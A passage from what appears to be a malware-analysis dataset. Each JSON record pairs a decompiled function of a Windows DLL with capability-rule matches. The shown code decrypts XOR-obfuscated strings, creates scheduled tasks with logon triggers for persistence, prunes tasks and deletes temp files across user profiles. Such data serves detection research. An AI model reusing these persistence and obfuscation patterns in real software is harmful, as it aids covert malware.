= *puVar11;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        cVar7 = '\\x04';\n                    }\n                    else {\n                        cVar7 = (-((uVar2 & 0x80000000) != 0) & 2U) + 2;\n                    }\n                }\n                else {\n                    cVar7 = (-((uVar2 & 0x80000000) != 0) & 0x20U) + 0x20;\n                }\n                var_ch = puVar11[-7];\n                var_24h = puVar11[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, cVar7, &var_28h);\n                puVar11 = puVar11 + 10;\n                uVar12 = uVar12 + 1;\n                pcVar10 = var_10h;\n            } while (uVar12 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar10 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1585
    },
    "0040d5c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040d5c8(uint noname_0, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint in_EDX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint uVar11;\n    uint ARG_0;\n    uint lpDst;\n    int32_t *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_3ch = 0;\n    puVar7 = &lpDst;\n    var_40h = in_EDX;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &ARG_0;\n    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    if (*0x427d44 == 0) {\n        var_28h = 0x4e014517;\n        var_24h = 0x56143831;\n        var_20h = 0x4e104560;\n        var_1ch = 0x561c382d;\n        var_18h = 0x4e1d4573;\n        var_14h = 0x5674382c;\n        var_10h._0_2_ = 0x4532;\n        var_8h = 0x4e544532;\n        var_4h = 0x56513862;\n        fcn.00401000(0x34);\n        uVar5 = 0;\n        do {\n            puVar1 = uVar5 + var_ch;\n            uVar2 = uVar5 & 0x80000007;\n            if (uVar2 < 0) {\n                uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n            }\n            uVar5 = uVar5 + 1;\n            *puVar1 = *(&var_8h + uVar2) ^ puVar1[&var_28h - var_ch];\n        } while (uVar5 < 0x1a);\n        uVar11 = 0x150;\n        iVar4 = var_ch;\n    }\n    else {\n        var_2ch = 0x580a7646;\n        var_28h = 0x6327587a;\n        var_24h = 0x350d4926;\n        var_20h = 0x76266a0c;\n        var_1ch = 0x587b581b;\n        var_18h = 0x493b632b;\n        var_14h = 0x6a7d351d;\n        var_10h._0_2_ = 0x7663;\n        var_8h = 0x58497663;\n        var_4h = var_4h & 0xff000000 | 0x6a5835;\n        fcn.00401000(0x3c);\n        iVar4 = var_ch;\n        iVar8 = 0;\n        iVar3 = &var_2ch - var_ch;\n        do {\n            var_ch = 7;\n            puVar1 = iVar8 + iVar4;\n            iVar6 = iVar8 % 7;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_8h + iVar6) ^ puVar1[iVar3];\n        } while (iVar8 < 0x1e);\n        uVar11 = 0x156;\n    }\n    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : decrypt (wide char) %s -> %ws\", uVar11);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar4, &lpDst, 0x104);\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n    var_38h = 0x51426c74;\n    var_34h = 0x6d6f361a;\n    var_30h = 0x51316c22;\n    var_8h = 0x51316c51;\n    var_4h = 0x6d4a3646;\n    fcn.00401000(0x18);\n    iVar4 = var_ch;\n    uVar5 = 0;\n    do {\n        puVar1 = uVar5 + var_ch;\n        uVar2 = uVar5 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar5 = uVar5 + 1;\n        *puVar1 = *(&var_8h + uVar2) ^ puVar1[&var_38h - var_ch];\n    } while (uVar5 < 0xc);\n    pcVar10 = \"wszDomainAndNameTemaplte_EncryptedStackedBuffer\";\n    uVar11 = 0x15c;\n    pcVar9 = \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : decrypt (wide char) %s -> %ws\";\n    iVar3 = var_ch;\n    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : decrypt (wide char) %s -> %ws\", 0x15c);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, &lpDst, arg_ch, pcVar9, uVar11, pcVar10, iVar3);\n    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : DomainAndName : %ws\", 0x162);\n    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : pwszApplicationName : %ws\", 0x163);\n    (**(*var_44h + 0x80))(var_44h, var_40h);\n    iVar3 = (**(*var_44h + 0x88))(var_44h, 0x414db0);\n    if (iVar3 < 0) {\n        uVar11 = 0x18d;\n        pcVar9 = \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : SetApplicationName failed: %x\";\n    }\n    else {\n        iVar3 = (**(*var_44h + 0x70))(var_44h, 0x2000);\n        if (iVar3 < 0) {\n            uVar11 = 0x188;\n            pcVar9 = \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : SetFlags failed: %x\";\n        }\n        else {\n            iVar3 = (**(*var_44h + 0x78))(var_44h, &ARG_0, 0);\n            if (iVar3 < 0) {\n                uVar11 = 0x183;\n                pcVar9 = \n                \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : SetAccountInformation failed: %x\";\n            }\n            else {\n                iVar3 = (**(*var_44h + 0xa8))(var_44h, 0xfffffffe);\n                if (iVar3 < 0) {\n                    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : [ITask.SetMaxRunTime failed][0x%x]\"\n                                 , 0x175);\n                }\n                iVar3 = fcn.0040d47d();\n                if (-1 < iVar3) {\n                    var_3ch = 1;\n                    goto code_r0x0040d897;\n                }\n                uVar11 = 0x17a;\n                pcVar9 = \n                \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10SetLogonTrigger : [CreatePeriodicTrigger failed][0x%x]\";\n            }\n        }\n    }\n    fcn.00403bde(pcVar9, uVar11);\ncode_r0x0040d897:\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n    return var_3ch;\n}\n",
        "token_count": 2112
    },
    "0040d9c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d9c0(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int16_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int16_t *piVar12;\n    int16_t *piVar13;\n    uint lpFileName;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int16_t *var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uchar var_48h;\n    uint var_47h;\n    uint var_43h;\n    uint var_3fh;\n    uint var_39h;\n    uint var_35h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t *ppv;\n    int32_t pv;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int16_t *var_4h;\n    \n    var_30h = 0x7a367523;\n    var_60h = 0;\n    var_24h = NULL;\n    ppv = NULL;\n    var_20h = NULL;\n    var_1ch = 0;\n    var_10h = 0;\n    var_2ch = 0x79527a59;\n    var_28h = 0x7a5a756b;\n    var_ch = 0x7a5a7547;\n    var_8h = 0x79707a35;\n    fcn.00401000(0x18);\n    piVar12 = var_54h;\n    uVar9 = 0;\n    do {\n        puVar1 = uVar9 + var_54h;\n        uVar5 = uVar9 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar9 = uVar9 + 1;\n        *puVar1 = *(&var_ch + uVar5) ^ puVar1[&var_30h - var_54h];\n    } while (uVar9 < 0xc);\n    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : decrypt (wide char) %s -> %ws\", 0x1ef);\n    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : >>>\", 0x1f2);\n    iVar6 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (-1 < iVar6) {\n        iVar6 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411680, 0, 1, 0x411660, &ppv);\n        if ((iVar6 < 0) || (ppv == NULL)) {\n            fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : cant create scheduler instace, error=%p\"\n                         , 0x248);\n        }\n        else {\n            iVar6 = (**(*ppv + 0x14))(ppv, &var_24h);\n            if ((iVar6 < 0) || (var_24h == NULL)) {\n                fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : cant create enumerator instace, error=%p\"\n                             , 0x242);\n            }\n            else {\n                iVar6 = (**(*var_24h + 0xc))(var_24h, 0xf, &var_1ch, &var_10h);\n                while ((-1 < iVar6 && (var_10h != 0))) {\n                    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : dwFetchedTasks=%p\", 0x204);\n                    while (var_10h != 0) {\n                        var_10h = var_10h + -1;\n                        uVar7 = *(var_1ch + var_10h * 4);\n                        var_5ch = uVar7;\n                        fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : TaskName : %p\\n\", 0x208)\n                        ;\n                        iVar6 = (**(*ppv + 0x18))(ppv, uVar7, 0x411650, &var_20h);\n                        if ((iVar6 < 0) || (var_20h == NULL)) {\n                            fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : pITS->Activate fail, error=%p\"\n                                         , 0x237);\n                        }\n                        else {\n                            pv = 0;\n                            var_4h = NULL;\n                            iVar6 = (**(*var_20h + 0x84))(var_20h, &pv);\n                            if ((-1 < iVar6) && (pv != 0)) {\n                                fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : ppApplicationName : %ws\\n\"\n                                             , 0x214);\n                                var_4ch = 0x370f751c;\n                                var_47h = 0x196e515a;\n                                var_43h = 0x69325b7a;\n                                var_3fh._0_1_ = 0x35;\n                                var_48h = 0x5c;\n                                stack0xffffffbf = 0x57375475;\n                                var_39h = 0x106e4d5a;\n                                var_35h._0_2_ = 0x377a;\n                                var_35h._2_1_ = 0x32;\n                                var_ch = 0x377a756e;\n                                var_8h = var_8h & 0xff000000 | 0x355a32;\n                                var_3fh._1_1_ = var_48h;\n                                fcn.00401000(0x34);\n                                iVar6 = var_58h;\n                                iVar11 = 0;\n                                do {\n                                    var_50h = 7;\n                                    puVar1 = iVar11 + var_58h;\n                                    iVar10 = iVar11 % 7;\n                                    iVar11 = iVar11 + 1;\n                                    *puVar1 = *(&var_ch + iVar10) ^ puVar1[&var_4ch - var_58h];\n                                } while (iVar11 < 0x1a);\n                                fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : decrypt (wide char) %s -> %ws\"\n                                             , 0x215);\n                                pcVar3 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                                iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pv, iVar6);\n                                piVar12 = var_54h;\n                                if (((iVar11 != 0) && (iVar11 = (**(*var_20h + 0x8c))(var_20h, &var_4h),  -1 < iVar11))\n                                   && (var_4h != NULL)) {\n                                    fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : ppCommandLine : %ws\\n\"\n                                                 , 0x21b);\n                                    iVar6 = (*pcVar3)(var_4h, piVar12);\n                                    piVar4 = var_4h;\n                                    if (((iVar6 != 0) && (*var_4h == 0x22)) &&\n                                       ((var_4h[2] == 0x3a && (var_4h[3] == 0x5c)))) {\n                                        puVar8 = &lpFileName;\n                                        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                            *puVar8 = 0;\n                                            puVar8 = puVar8 + 1;\n                                        }\n                                        piVar13 = piVar12;\n                                        do {\n                                            iVar2 = *piVar13;\n                                            piVar13 = piVar13 + 1;\n                                        } while (iVar2 != var_60h);\n                                        iVar6 = (*pcVar3)(piVar4, piVar12);\n                                        (*_sym.imp.SHLWAPI.dll_StrCpyNW)\n                                                  (&lpFileName, var_4h + 1, \n                                                   ((iVar6 - var_4h >> 1) - 2) + (piVar13 - (piVar12 + 1) >> 1));\n                                        puVar8 = &lpFileName;\n                                        do {\n                                            iVar2 = *puVar8;\n                                            puVar8 = puVar8 + 2;\n                                        } while (iVar2 != 0);\n                                        fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : FullDllPath : \\\"%ws\\\" (len=%d)\\n\"\n                                                     , 0x228);\n                                        iVar6 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(&lpFileName);\n                                        if (iVar6 == -1) {\n                                            fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > SchRemoveDangerousTasks : remove task file \\'%ws\\'\"\n                                                         , 0x22b);\n                                            (**(*ppv + 0x1c))(ppv, var_5ch);\n                                        }\n                                    }\n                                    (*_sym.imp.ole32.dll_CoTaskMemFree)(var_4h);\n                                    iVar6 = var_58h;\n                                }\n                                (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                                uVar7 = var_5ch;\n                            }\n                            (**(*var_20h + 8))(var_20h);\n                        }\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(uVar7);\n                    }\n                    (*_sym.imp.ole32.dll_CoTaskMemFree)(var_1ch);\n                    iVar6 = (**(*var_24h + 0xc))(var_24h, 0xf, &var_1ch, &var_10h);\n                }\n                (**(*var_24h + 8))(var_24h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar12);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return;\n}\n",
        "token_count": 2495
    },
    "0040df00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040df00(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    uint uVar11;\n    char *pcVar12;\n    int32_t iVar13;\n    uint lpFindFileData;\n    uint psz1;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint lpcchSize;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t hFindFile;\n    uint lpProfileDir;\n    int32_t var_40h;\n    uint ARG_0;\n    int32_t var_38h;\n    uint lpFileName;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    fcn.00403bde(0x419ddc, 0x2e);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpProfileDir = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    uVar4 = (*pcVar3)(0, 0x208);\n    lpFileName = (*pcVar2)(uVar4);\n    uVar4 = (*pcVar3)(0, 0x208);\n    ARG_0 = (*pcVar2)(uVar4);\n    lpcchSize = 0x104;\n    var_30h = 0x540d4d15;\n    var_2ch = 0x56556531;\n    var_28h = 0x54424d35;\n    var_24h = 0x56516501;\n    var_20h = 0x54164d2d;\n    var_1ch = 0x565a653b;\n    var_18h = 0x54114d3e;\n    var_14h = 0x5660650e;\n    var_10h = 0x540f4d3c;\n    var_ch = 0x56346522;\n    var_8h = 0x54624d59;\n    var_4h = 0x56346552;\n    fcn.00401000(0x50);\n    var_70h = var_68h;\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_68h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_8h + uVar5) ^ puVar1[&var_30h - var_68h];\n    } while (uVar7 < 0x28);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : decrypt (wide char) %s -> %ws\", 0x36);\n    var_30h = 0x311f632e;\n    var_2ch = 0x390a661d;\n    var_28h = 0x311b630e;\n    var_24h = 0x3912660c;\n    var_20h = 0x31006323;\n    var_1ch = 0x392f660e;\n    var_18h = 0x31336303;\n    var_14h = 0x392b6639;\n    var_10h = 0x311f6302;\n    var_ch = CONCAT22(var_ch._2_2_, 0x666d);\n    var_8h = 0x316f636f;\n    var_4h = 0x394e666d;\n    fcn.00401000(0x4c);\n    var_74h = var_64h;\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_64h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_8h + uVar5) ^ puVar1[&var_30h - var_64h];\n    } while (uVar7 < 0x26);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : decrypt (wide char) %s -> %ws\", 0x37);\n    uVar4 = lpProfileDir;\n    iVar6 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    if (iVar6 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar4);\n        fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : ProfilesPathMask : %ws\", 0x42);\n        fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : ProfilesPath : %ws\", 0x43);\n        uVar11 = lpFileName;\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        uVar4 = lpProfileDir;\n        while (hFindFile != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x419dd0);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x419dd4),  iVar6 != 0)) {\n                fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : FindFileData.cFileName : %ws\", 0x4c);\n                var_8h = 0x4413381e;\n                var_60h = 0;\n                var_4h = CONCAT22(var_4h._2_2_, 0x7145);\n                var_50h = 0x44393842;\n                var_4ch = 0x58547145;\n                var_58h = 0x456e5676;\n                var_54h = 0x35464236;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(uVar11, uVar4);\n                    fcn.00401000(0xc);\n                    iVar6 = var_40h;\n                    uVar7 = 0;\n                    do {\n                        puVar1 = uVar7 + var_40h;\n                        uVar5 = uVar7 & 0x80000007;\n                        if (uVar5 < 0) {\n                            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar7 = uVar7 + 1;\n                        *puVar1 = *(&var_50h + uVar5) ^ puVar1[&var_8h - var_40h];\n                    } while (uVar7 < 6);\n                    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : decrypt (wide char) %s -> %ws\", 0x52)\n                    ;\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar6);\n                    var_1ch = 0x451d5653;\n                    var_18h = 0x3563426a;\n                    var_14h = 0x45325605;\n                    var_10h = 0x35354213;\n                    var_ch = CONCAT22(var_ch._2_2_, 0x5676);\n                    fcn.00401000(0x24);\n                    iVar6 = var_38h;\n                    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar7 = 0;\n                    do {\n                        puVar1 = uVar7 + var_38h;\n                        uVar5 = uVar7 & 0x80000007;\n                        if (uVar5 < 0) {\n                            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar7 = uVar7 + 1;\n                        *puVar1 = *(&var_58h + uVar5) ^ puVar1[&var_1ch - var_38h];\n                    } while (uVar7 < 0x12);\n                    pcVar12 = \"wszProfilesTempPathTemplate_EncryptedStackedBuffer\";\n                    uVar11 = 0x55;\n                    pcVar10 = \"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : decrypt (wide char) %s -> %ws\";\n                    iVar13 = var_38h;\n                    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : decrypt (wide char) %s -> %ws\", 0x55)\n                    ;\n                    uVar4 = lpProfileDir;\n                    (*_sym.imp.USER32.dll_wsprintfW)\n                              (ARG_0, iVar6, lpProfileDir, &psz1, (&var_74h)[var_60h], pcVar10, uVar11, pcVar12, iVar13)\n                    ;\n                    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : REMOVE : %ws\", 0x5b);\n                    fcn.004072c1(1);\n                    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : REMOVE : %ws -> done!\", 0x5d);\n                    uVar11 = (*pcVar3)(0, iVar6);\n                    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n                    uVar11 = (*pcVar3)(0, var_40h);\n                    (*pcVar2)(uVar11);\n                    var_60h = var_60h + 1;\n                    uVar11 = lpFileName;\n                } while (var_60h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n                hFindFile = -1;\n            }\n        }\n    }\n    var_2ch = 0x4e294650;\n    var_28h = 0x75065432;\n    var_24h = 0x4b2b7a32;\n    var_20h = 0x46277539;\n    var_1ch = 0x54244e15;\n    var_18h = 0x7a637501;\n    var_14h = 0x75004b12;\n    var_10h = 0x4e174610;\n    var_ch = 0x7575543b;\n    var_8h = 0x4e7a4675;\n    var_4h = var_4h & 0xff000000 | 0x75544b;\n    fcn.00401000(0x48);\n    iVar6 = var_38h;\n    iVar9 = 0;\n    iVar13 = &var_2ch - var_38h;\n    do {\n        var_38h = 7;\n        puVar1 = iVar9 + iVar6;\n        iVar8 = iVar9 % 7;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[iVar13];\n    } while (iVar9 < 0x24);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : decrypt (wide char) %s -> %ws\", 0x68);\n    uVar4 = lpProfileDir;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, lpProfileDir, 0x104);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : REMOVE : %ws\", 0x6b);\n    fcn.004072c1(1);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar11 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n    uVar11 = (*pcVar2)(0, ARG_0);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar11);\n    uVar4 = (*pcVar2)(0, uVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > RemoveAllTempFiles : <<<\", 0x73);\n    uVar4 = (*pcVar2)(0, iVar6);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*pcVar2)(0, var_64h);\n    (*pcVar3)(uVar4);\n    uVar4 = (*pcVar2)(0, var_68h);\n    (*pcVar3)(uVar4);\n    return;\n}\n",
        "token_count": 3213
    },
    "0040e444": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040e444(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    code *pcVar14;\n    uint *puVar15;\n    uint *puVar16;\n    int16_t *piVar17;\n    uint *puVar18;\n    char *pcVar19;\n    char *pcVar20;\n    uint lpFindFileData;\n    uint lpString1;\n    int32_t var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint *lpMem;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    int32_t hFindFile;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint var_50h;\n    int16_t *lpProfileDir;\n    uchar *lpFileName;\n    uchar *ARG_0;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t lpcchSize;\n    uint32_t var_4h;\n    \n    var_b8h = 0;\n    ARG_0 = NULL;\n    lpcchSize = 0;\n    (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(0, &lpcchSize);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > IsMagicTempFileExists : dwProfilePathSize : %d\", 0x94);\n    pcVar14 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (lpcchSize != 0) {\n        lpcchSize = lpcchSize + 10;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpcchSize * 2);\n        pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n        piVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        lpProfileDir = piVar5;\n        uVar4 = (*pcVar14)(0, lpcchSize * 2);\n        puVar6 = (*pcVar3)(uVar4);\n        lpFileName = puVar6;\n        if (piVar5 != NULL) {\n            uVar4 = (*pcVar14)(0, 0x208);\n            puVar7 = (*pcVar3)(uVar4);\n            puVar6 = lpFileName;\n            puVar16 = &lpFindFileData;\n            ARG_0 = puVar7;\n            for (iVar10 = 0x250; piVar5 = lpProfileDir,  iVar10 != 0; iVar10 = iVar10 + -1) {\n                *puVar16 = 0;\n                puVar16 = puVar16 + 1;\n            }\n            for (iVar10 = 